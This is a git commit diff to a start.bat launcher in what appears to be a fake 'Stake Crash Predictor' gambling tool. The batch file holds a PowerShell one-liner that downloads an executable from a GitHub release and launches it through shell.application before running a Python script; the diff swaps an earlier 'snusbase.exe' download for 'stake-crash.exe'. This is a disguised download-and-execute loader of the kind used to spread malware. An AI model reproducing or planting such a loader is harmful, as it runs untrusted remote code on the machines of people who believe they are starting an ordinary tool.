52c17ac421202fc02d5fe9f4763a9baa06d19d5e
Stake-Community <discordoulahi@gmx.fr>
2024-09-12 20:32:30 +0200

    Update start.bat

--- start.bat
+++ start.bat
@@ -5,9 +5,9 @@ rem You can do any color
 color 0c
 
 echo.
-echo Coded By https://github.com/IWcommunityFR
+echo Coded By https://github.com/Stake-Community
 echo.
 cd src
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/snusbase-tool/releases/download/snusbase/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
 py main.py
 Key : 01266156
